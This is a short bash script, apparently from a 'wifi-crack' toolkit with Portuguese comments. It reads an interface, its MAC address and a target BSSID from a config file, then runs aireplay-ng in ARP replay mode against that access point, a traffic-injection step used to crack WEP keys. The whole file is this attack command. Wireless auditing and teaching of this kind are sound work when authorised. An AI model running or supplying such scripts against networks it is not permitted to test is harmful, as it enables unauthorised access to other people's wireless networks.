#!/bin/bash

PWD="$(pwd)"
source "$PWD/wifi-crack.conf"
#### VARIAVEIS UTILIZADAS
# INTERFACE
# INTERFACE_MAC
# BSSID


aireplay-ng --arpreplay -b "$BSSID" -h "$INTERFACE_MAC" $INTERFACE
